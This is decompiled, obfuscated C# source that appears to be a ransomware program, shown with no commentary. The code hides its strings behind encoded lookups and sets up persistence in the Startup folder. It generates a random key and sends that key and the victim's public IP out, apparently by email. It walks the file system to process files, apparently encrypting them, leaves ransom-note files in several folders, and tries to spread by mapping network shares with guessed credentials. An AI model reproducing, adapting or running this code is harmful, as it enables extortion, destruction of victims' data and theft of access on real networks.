	public static string UmYbFPakVvjG;

	public static string OVsecWAEVkGcGjJDv;

	public static string[] KRkKkskNZSstTnnF;

	public static string lAmPIwcPEjNhXG;

	public static bool jwIpebsbuTtJKU;

	public static string baebLNYmOilG;

	public static bool HHLzNKWftxhcT;

	public static bool nCFuCxDDXURK;

	public static bool ztMqipVfVlgMZOq;

	public static bool FozVogARTDEY;

	public static string UvHPjcAlchtwE;

	public static bool geeOWbkDyamU;

	public static bool hUQCboiKyWJxZi;

	public static bool yrqPvlUpuGZW;

	public static bool bLbMRmlIqKb;

	public static bool aDzhxFxDvB;

	public static string AGuLAAdWUTO;

	public static List<string> TdgxQRgoFMw;

	public static List<string> iaHlLkaXwuio;

	public static List<string> nKPyjivwjXGlLxX;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			NFcTJoyMAlaMTsP CS_0024_003C_003E8__locals0 = new NFcTJoyMAlaMTsP();
			CS_0024_003C_003E8__locals0.nwAYAbmTKnUjGt = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.nwAYAbmTKnUjGt) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			KdKiCrKeuciOqG.HTkeHKTcTuYeMbW(AtNcgpYdstMFwdNy);
		}
		catch (Exception)
		{
		}
		try
		{
			if (VbexJOEZOrg == getString_0(107396810))
			{
				Thread thread = new Thread(zCPELVGCwqE.xGbIhWavcDjLD);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (mqeQDptBukI == getString_0(107396810))
		{
			Thread.Sleep(int.Parse(hYdMzWyQBJgl));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FLSEvrhuWfJ == getString_0(107396810))
		{
			try
			{
				lTXmluGHHUZ(dAXyboFAql(getString_0(107396837)));
			}
			catch
			{
			}
		}
		if (dqMjwzdylpdLK == getString_0(107396810))
		{
			hQckcNGWHqE.LfqZChyBnexU();
		}
		try
		{
			if (ihApggwfGvkG == getString_0(107396810) && qZUAYkWNRrboF.gyMCHsoZEnR())
			{
				new gJWYxRJeVCkFVgzzr().tleqwHPZiMkR(bool_0: false);
				qZUAYkWNRrboF.waTdtZodPP();
			}
		}
		catch (Exception)
		{
		}
		if (FJXsFcPZKBWlNn == getString_0(107396810) && qZUAYkWNRrboF.gyMCHsoZEnR())
		{
			new gJWYxRJeVCkFVgzzr().tleqwHPZiMkR(bool_0: false);
			new gJWYxRJeVCkFVgzzr().FbzTIYGIJLlE();
		}
		if (VpJGOcUaTwfpij == getString_0(107396810))
		{
			iBPErbGdHq.jGMhPhoaet();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396732);
			string text2 = text + Path.GetFileName(fileName);
			if (iWUecWvWvdy == getString_0(107396810) && fileName != text2)
			{
				Thread thread2 = new Thread(uDJagraVZIVyN);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (aNVPohsbWbid == getString_0(107396810) && mainModule != null && fileName != text2)
			{
				try
				{
					aSuWOKqpTFWLZt = iHfvaPnAZPll(0, pjYhYVVkRFVa.Count);
					File.Copy(fileName, text + pjYhYVVkRFVa[aSuWOKqpTFWLZt], overwrite: true);
					Process.Start(text + pjYhYVVkRFVa[aSuWOKqpTFWLZt]);
					jDNtEuxKPmD();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (aWvdmtYWLU == getString_0(107396810) && DateTime.Now < fpPKoegyFTl)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (DRlOGAWkgnPyhTM == getString_0(107396810) && DateTime.Now > odkofmjGNehiR)
			{
				jDNtEuxKPmD();
			}
		}
		catch
		{
		}
		dVbLgGshjXnN();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> mUKeFWwqRbsUt = MUKeFWwqRbsUt;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						SyapfBslvXsCZq(getString_0(107389438), string_0);
					};
				}
				Parallel.ForEach(mUKeFWwqRbsUt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> uitWgaprnpOe = UitWgaprnpOe;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						SyapfBslvXsCZq(getString_0(107392550), string_0);
					};
				}
				Parallel.ForEach(uitWgaprnpOe, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> qxnFKMJGHHM = QxnFKMJGHHM;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						SyapfBslvXsCZq(dAXyboFAql(getString_0(107389397)), string_0);
					};
				}
				Parallel.ForEach(qxnFKMJGHHM, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (OVsecWAEVkGcGjJDv == getString_0(107396810))
				{
					string[] kRkKkskNZSstTnnF = KRkKkskNZSstTnnF;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							SyapfBslvXsCZq(dAXyboFAql(getString_0(107389397)), getString_0(107389404) + string_0 + getString_0(107389363));
						};
					}
					Parallel.ForEach(kRkKkskNZSstTnnF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				if (!QTpaEkHdBvx().Contains(getString_0(107389074)))
				{
					PqGDLlSfOjAxfa(yaObxwDYeQoq);
				}
				else
				{
					List<string> source = tYFycaveyEZlTZa;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
						{
							SyapfBslvXsCZq(dAXyboFAql(NcLuovKFaQKveac(getString_0(107389358))), string_0);
						};
					}
					Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				}
				List<string> dZKPMstogvMqutY = DZKPMstogvMqutY;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						SyapfBslvXsCZq(dAXyboFAql(getString_0(107389333)), string_0);
					};
				}
				Parallel.ForEach(dZKPMstogvMqutY, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> source2 = jGCPbbWylwhkiZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						SyapfBslvXsCZq(getString_0(107389348), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && ztMqipVfVlgMZOq)
			{
				try
				{
					Thread thread4 = new Thread(pJswyHAAwAPBQL.yUPzlDHtQyNf);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			SyapfBslvXsCZq(getString_0(107397207), dAXyboFAql(getString_0(107397194)));
			SyapfBslvXsCZq(getString_0(107397207), dAXyboFAql(getString_0(107397153)));
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107397096)), dAXyboFAql(getString_0(107397083)));
			SyapfBslvXsCZq(dAXyboFAql(getString_0(107397096)), dAXyboFAql(getString_0(107396441)));
		}
		if (MblmlkeceAY == getString_0(107396810) && YmsJgjwLnbr() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(XkrLZpIpGzIUW.YjYibZIjKubHuQj);
			thread5.IsBackground = true;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = eKcpSjrBmJYP == getString_0(107396810);
		SecureString secureString = new SecureString();
		if (EgQwzOCvnHMPfG == getString_0(107396267))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(33, 127) % 255);
				if (Convert.ToInt32(value) != 34 && Convert.ToInt32(value) != 92)
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
				else
				{
					i--;
				}
			}
		}
		else
		{
			OFTUyyIDOSKVU = getString_0(107396294);
		}
		WFhUCfopZvgdKa = ntOxoEXCcs.TSaKwZntIBTq(ChQyNeuqmgO(secureString));
		if (yrqPvlUpuGZW)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO), string.Concat(dAXyboFAql(getString_0(107396249)), new WebClient().DownloadString(dAXyboFAql(getString_0(107396224))), getString_0(107396663), dAXyboFAql(getString_0(107396658)), DateTime.Now, getString_0(107396663), dAXyboFAql(getString_0(107396617)), WFhUCfopZvgdKa));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), AGuLAAdWUTO), getString_0(107396560) + WFhUCfopZvgdKa);
				}
			}
			catch (Exception ex7)
			{
				if (geeOWbkDyamU)
				{
					try
					{
						File.AppendAllText(UvHPjcAlchtwE, getString_0(107396531) + ex7.Message + getString_0(107396663));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		QPOfKtKHpOUCX.xQjbIHzfsFqUJM(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), CrIMGxZNxmnsF), BGydPYDssQtWd(WFhUCfopZvgdKa), null, null, getString_0(107396514), getString_0(107396465), null);
		if (YIPXGAmIVTAgIi == getString_0(107396810))
		{
			try
			{
				XbUqecnrFWmnE();
			}
			catch
			{
			}
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			FoTKlZItqKuqTQ();
		}
		try
		{
			KsHJoxiFpq(new string[1] { getString_0(107396480) }, new string[100]
			{
				getString_0(107395927),
				getString_0(107395922),
				getString_0(107395917),
				getString_0(107395940),
				getString_0(107395935),
				getString_0(107395930),
				getString_0(107395893),
				getString_0(107395888),
				getString_0(107395883),
				getString_0(107395910),
				getString_0(107395905),
				getString_0(107395900),
				getString_0(107395859),
				getString_0(107395854),
				getString_0(107395877),
				getString_0(107395872),
				getString_0(107395867),
				getString_0(107395830),
				getString_0(107395825),
				getString_0(107395820),
				getString_0(107395843),
				getString_0(107395838),
				getString_0(107395833),
				getString_0(107395796),
				getString_0(107395791),
				getString_0(107395786),
				getString_0(107395813),
				getString_0(107395808),
				getString_0(107395803),
				getString_0(107395766),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395783),
				getString_0(107395778),
				getString_0(107395769),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395893),
				getString_0(107395749),
				getString_0(107395883),
				getString_0(107395740),
				getString_0(107395703),
				getString_0(107395698),
				getString_0(107395693),
				getString_0(107395720),
				getString_0(107395715),
				getString_0(107395710),
				getString_0(107395705),
				getString_0(107396180),
				getString_0(107396175),
				getString_0(107396170),
				getString_0(107396197),
				getString_0(107396192),
				getString_0(107396187),
				getString_0(107396150),
				getString_0(107396145),
				getString_0(107396140),
				getString_0(107396163),
				getString_0(107396158),
				getString_0(107396117),
				getString_0(107396136),
				getString_0(107395749),
				getString_0(107396123),
				getString_0(107396082),
				getString_0(107396073),
				getString_0(107396096),
				getString_0(107396055),
				getString_0(107396046),
				getString_0(107396041),
				getString_0(107396064),
				getString_0(107396023),
				getString_0(107396014),
				getString_0(107396009),
				getString_0(107396036),
				getString_0(107396031),
				getString_0(107396026),
				getString_0(107395989),
				getString_0(107395984),
				getString_0(107396007),
				getString_0(107396002),
				getString_0(107395997),
				getString_0(107395960),
				getString_0(107395955),
				getString_0(107395950),
				getString_0(107395973),
				getString_0(107395964),
				getString_0(107395415),
				getString_0(107395783),
				getString_0(107395410),
				getString_0(107395405),
				getString_0(107395432),
				getString_0(107395427),
				getString_0(107395422),
				getString_0(107395381),
				getString_0(107395376),
				getString_0(107395371),
				getString_0(107395394),
				getString_0(107395389),
				getString_0(107395352)
			}, new string[0], ChQyNeuqmgO(secureString), getString_0(107395347));
		}
		catch (Exception ex9)
		{
			if (geeOWbkDyamU)
			{
				try
				{
					File.AppendAllText(UvHPjcAlchtwE, getString_0(107395366) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309));
				streamWriter.WriteLine(dAXyboFAql(getString_0(107395276)));
				streamWriter.WriteLine(getString_0(107396663));
				streamWriter.WriteLine(dAXyboFAql(getString_0(107393290)));
				streamWriter.WriteLine(WFhUCfopZvgdKa);
				if (HpbWCpkqwlpVpmb == getString_0(107396267))
				{
					streamWriter.WriteLine(getString_0(107396663));
					streamWriter.WriteLine(dAXyboFAql(getString_0(107393257)) + Convert.ToString(mfvCVNdCLAD.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309), getString_0(107393212) + WFhUCfopZvgdKa);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in PYEHnBxJBpISsEZ)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395309)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309), item + getString_0(107395309), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395309), getString_0(107393212) + WFhUCfopZvgdKa);
				}
			}
			catch (Exception)
			{
			}
			if (!FozVogARTDEY && num > 10)
			{
				break;
			}
		}
		if (xoOIzmzChOZBJa == getString_0(107396810))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393183)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393183));
					streamWriter2.WriteLine(dAXyboFAql(getString_0(107393150)));
					streamWriter2.WriteLine(getString_0(107396663));
					streamWriter2.WriteLine(dAXyboFAql(getString_0(107393613)));
					streamWriter2.WriteLine(WFhUCfopZvgdKa + dAXyboFAql(getString_0(107393524)));
					if (HpbWCpkqwlpVpmb == getString_0(107396267))
					{
						streamWriter2.WriteLine(getString_0(107396663));
						streamWriter2.WriteLine(dAXyboFAql(getString_0(107393543)) + dAXyboFAql(getString_0(107393257)) + Convert.ToString(mfvCVNdCLAD.Count) + dAXyboFAql(getString_0(107393524)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393183), dAXyboFAql(getString_0(107393543)) + getString_0(107393212) + WFhUCfopZvgdKa + dAXyboFAql(getString_0(107393524)));
				}
			}
			catch
			{
			}
		}
		if (WdQFHfcExMiYlnK == getString_0(107396810))
		{
			try
			{
				if (HpbWCpkqwlpVpmb == getString_0(107396267))
				{
					jJNOnNgWhS.eJmCghSDKXkKiu(getString_0(107393450), getString_0(107393477), getString_0(107393432), string.Concat(dAXyboFAql(getString_0(107396249)), new WebClient().DownloadString(dAXyboFAql(getString_0(107396224))), getString_0(107393423), dAXyboFAql(getString_0(107396658)), DateTime.Now, getString_0(107396663), dAXyboFAql(getString_0(107393418)), Convert.ToString(mfvCVNdCLAD.Count), getString_0(107396663), dAXyboFAql(getString_0(107396617)), WFhUCfopZvgdKa));
				}
				else
				{
					jJNOnNgWhS.eJmCghSDKXkKiu(getString_0(107393450), getString_0(107393477), getString_0(107393432), string.Concat(dAXyboFAql(getString_0(107396249)), new WebClient().DownloadString(dAXyboFAql(getString_0(107396224))), getString_0(107393423), dAXyboFAql(getString_0(107396658)), DateTime.Now, getString_0(107396663), dAXyboFAql(getString_0(107393418)), Convert.ToString(mfvCVNdCLAD.Count), getString_0(107396663), dAXyboFAql(getString_0(107396617)), WFhUCfopZvgdKa));
				}
			}
			catch
			{
			}
		}
		if (SotcHURFSsO == getString_0(107396810))
		{
			try
			{
				bKMYCHQcPDTj.ljJYxflGpbJHA(new Uri(getString_0(107393401)));
			}
			catch
			{
			}
		}
		if (xoOIzmzChOZBJa == getString_0(107396267))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309)))
				{
					Process.Start(dAXyboFAql(getString_0(107392856)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395309));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393183)))
				{
					Process.Start(dAXyboFAql(getString_0(107392863)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107393183));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(xNSqMIOLMLAwy))
		{
			try
			{
				File.Delete(xNSqMIOLMLAwy);
			}
			catch
			{
			}
		}
		if (geeOWbkDyamU)
		{
			try
			{
				File.AppendAllText(UvHPjcAlchtwE, getString_0(107392814));
			}
			catch (Exception)
			{
			}
		}
		if (XTNtJjAvASbm == getString_0(107392833))
		{
			jDNtEuxKPmD();
		}
	}

	public static void uDJagraVZIVyN()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(dAXyboFAql(getString_0(107392792)), dAXyboFAql(getString_0(107392670)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int iHfvaPnAZPll(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> rdJZzJUJKNMo(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107392621)) && !text.ToLower().Contains(getString_0(107393112)) && !text.ToLower().Contains(getString_0(107393099)) && !text.ToLower().Contains(getString_0(107393118)) && !text.ToLower().Contains(getString_0(107393093)) && !text.ToLower().Contains(getString_0(107393040)) && !text.ToLower().Contains(getString_0(107393059)) && !text.ToLower().Contains(getString_0(107393014)) && !text.ToLower().Contains(getString_0(107392977)) && !text.ToLower().Contains(getString_0(107393000)) && !text.ToLower().Contains(getString_0(107392951)) && !text.ToLower().Contains(getString_0(107393040)) && !text.ToLower().Contains(getString_0(107392938)) && !text.ToLower().Contains(getString_0(107392917)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107392924)) && !fileInfo.FullName.Contains(getString_0(107392875)) && !fileInfo.FullName.Contains(getString_0(107392890)) && !fileInfo.FullName.Contains(getString_0(107392329)) && !fileInfo.FullName.Contains(getString_0(107392312)) && !fileInfo.FullName.Contains(getString_0(107392327)) && !fileInfo.FullName.Contains(getString_0(107392278)) && !fileInfo.FullName.Contains(getString_0(107392293)) && !fileInfo.FullName.Contains(getString_0(107392248)) && !fileInfo.FullName.Contains(getString_0(107392259)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392214)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392201)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392184)) && !fileInfo.FullName.ToLower().Contains(getString_0(107392199)) && !fileInfo.FullName.Contains(dAXyboFAql(getString_0(107392150))) && !fileInfo.FullName.Contains(getString_0(107392157)) && !fileInfo.FullName.Contains(getString_0(107392112)) && !fileInfo.FullName.EndsWith(getString_0(107395347)) && !fileInfo.FullName.EndsWith(getString_0(107392599)) && !fileInfo.FullName.EndsWith(getString_0(107392594)) && !fileInfo.FullName.EndsWith(getString_0(107392589)) && !fileInfo.FullName.EndsWith(getString_0(107392616)) && !fileInfo.FullName.Contains(getString_0(107392611)) && !fileInfo.FullName.Contains(CrIMGxZNxmnsF) && !fileInfo.FullName.Contains(UvHPjcAlchtwE) && !fileInfo.FullName.Contains(AGuLAAdWUTO))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(VQcuZcdUECpj) * 1024.0 * 1024.0 && cIxqzYzUXVduz == getString_0(107396810))
						{
							list.Add(fileInfo.FullName);
							lehKMWZapuz(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && cIxqzYzUXVduz == getString_0(107396267))
						{
							list.Add(fileInfo.FullName);
							lehKMWZapuz(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string SyapfBslvXsCZq(string NTGqfdMMlKrDv = "", string TGbfRyRMArFsm = "")
	{
		string result = getString_0(107393401);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = NTGqfdMMlKrDv,
				Arguments = TGbfRyRMArFsm,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void lTXmluGHHUZ(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392562),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string NcLuovKFaQKveac(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string dAXyboFAql(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void XbUqecnrFWmnE()
	{
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b8: Expected O, but got Unknown
		//IL_05d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_05da: Expected O, but got Unknown
		XkrLZpIpGzIUW.WcGaNTogElcxHCFa();
		nKPyjivwjXGlLxX = XkrLZpIpGzIUW.jCBfcqLeIJiovDQ();
		List<OwVfFGsvPj> list = OwVfFGsvPj.HITVUyyaRenlpF();
		foreach (OwVfFGsvPj item in list)
		{
			iaHlLkaXwuio.Add(item.IPAddress);
		}
		TdgxQRgoFMw = nKPyjivwjXGlLxX.Union(iaHlLkaXwuio).ToList();
		foreach (string item2 in TdgxQRgoFMw)
		{
			if ((!item2.StartsWith(getString_0(107392577)) && !item2.StartsWith(getString_0(107392572)) && !item2.StartsWith(getString_0(107392531)) && !item2.StartsWith(getString_0(107393401))) || !XkrLZpIpGzIUW.BlQaGIgajUX(item2))
			{
				continue;
			}
			try
			{
				if (lAoTEijSeOCrur == getString_0(107396810))
				{
					for (int i = 0; i < XkrLZpIpGzIUW.PnvVzbsgauow.Count; i++)
					{
						SyapfBslvXsCZq(getString_0(107392550), getString_0(107392537) + item2 + getString_0(107392496) + XkrLZpIpGzIUW.PnvVzbsgauow[i] + getString_0(107392515) + XkrLZpIpGzIUW.SpnhDMEosoca[i]);
					}
				}
				else
				{
					SyapfBslvXsCZq(getString_0(107392550), getString_0(107392537) + item2);
				}
			}
			catch
			{
			}
		}
		try
		{
			XkrLZpIpGzIUW.xZWcgFFKtqP xZWcgFFKtqP = new XkrLZpIpGzIUW.xZWcgFFKtqP(XkrLZpIpGzIUW.GNGyGoZvnEtSW.xSiyVTGqxFfo, XkrLZpIpGzIUW.otpRlEoFBjrP.BrzibxxUHTqCRH, XkrLZpIpGzIUW.jfBDnrCLwhSyXX.tnnIayOplqT, XkrLZpIpGzIUW.JaiZZywDZVa.ZnvIkzkTBSxPdm);
			foreach (string item3 in xZWcgFFKtqP)
			{
				MatchCollection matchCollection = Regex.Matches(item3, getString_0(107392510));
				foreach (Match item4 in matchCollection)
				{
					try
					{
						if (lAoTEijSeOCrur == getString_0(107396810))
						{
							for (int j = 0; j < XkrLZpIpGzIUW.PnvVzbsgauow.Count; j++)
							{
								SyapfBslvXsCZq(getString_0(107392550), getString_0(107392397) + item4.ToString() + getString_0(107392496) + XkrLZpIpGzIUW.PnvVzbsgauow[j] + getString_0(107392515) + XkrLZpIpGzIUW.SpnhDMEosoca[j]);
							}
						}
						else
						{
							SyapfBslvXsCZq(getString_0(107392550), getString_0(107392397) + item4.ToString());
						}
					}
					catch
					{
					}
					if (!PelwIoYLMluwkT.Contains(item4.ToString()))
					{
						PelwIoYLMluwkT.Add(item4.ToString());
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = NcLuovKFaQKveac(getString_0(107392420));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(dAXyboFAql(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(dAXyboFAql(getString_0(107391803)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(dAXyboFAql(getString_0(107391746)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (cCTuunwfNioo == getString_0(107396810))
		{
			try
			{
				string text = Path.GetTempFileName().Replace(getString_0(107391669), getString_0(107391660));
				File.WriteAllText(text, dAXyboFAql(getString_0(107391683)), Encoding.ASCII);
				SyapfBslvXsCZq(getString_0(107397207), getString_0(107390597) + text);
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390592))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107390592)));
				}
				if (File.Exists(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391063))))
				{
					File.Delete(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), getString_0(107391063)));
				}
			}
			catch
			{
			}
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107391054));
		ManagementObjectEnumerator enumerator5 = val.Get().GetEnumerator();
		try
		{
			while (enumerator5.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator5.get_Current();
				if (!PelwIoYLMluwkT.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391033), getString_0(107396732)).Replace(getString_0(107390996), getString_0(107391033))
					.Replace(getString_0(107390987), getString_0(107393401))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					PelwIoYLMluwkT.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107391033), getString_0(107396732)).Replace(getString_0(107390996), getString_0(107391033))
						.Replace(getString_0(107390987), getString_0(107393401))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107391014), getString_0(107393401)) + getString_0(107391005));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator5)?.Dispose();
		}
	}

	public static bool YmsJgjwLnbr()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107390964));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

